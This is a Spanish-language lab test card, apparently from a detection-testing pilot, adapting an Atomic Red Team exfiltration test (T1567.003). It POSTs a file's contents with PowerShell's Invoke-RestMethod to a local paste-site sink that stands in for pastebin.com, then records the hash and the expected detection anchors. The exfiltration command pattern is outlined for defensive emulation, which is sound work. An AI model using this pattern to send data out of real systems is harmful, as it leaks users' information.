# ATA059 - T1567.003 Exfiltration to Text Storage Sites (Windows, `victima-windows`)

> **B1.1 (piloto mixto).** Canal **SSH**. **ART adaptado**: `T1567.003` ->
> *Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows)*
> (`c2e8ab6e-431e-460a-a2aa-3bc6a32022e3`).

## Que hace

1. Escribe `evidencias/paste.txt` con el contenido de la atomica.
2. `Invoke-RestMethod -Method Post -Body <texto> -ContentType text/plain` a
   `http://192.168.65.1:9090/paste/ATA059` (sitio de pegado local).
3. Anota `t0/t1`, URL, longitud y `sha256` del cuerpo.

**Adaptacion declarada**: pastebin.com -> `paste.local:9090`; cuerpo en texto plano UTF-8
en vez del formulario `api_dev_key/api_paste_code` (para demostrar el `sha256`).
El mecanismo (POST del dato a un sitio de texto) es el mismo.

## Prueba de efecto

`sink.log`: `POST /paste/ATA059 ... sha256=<hash>` con el `sha256` del cuerpo enviado.

## Esperado

`ATA059_esperado.csv`: `win_image` + ancla `win_command_line` con `C:\lab-attack\ATA059`.
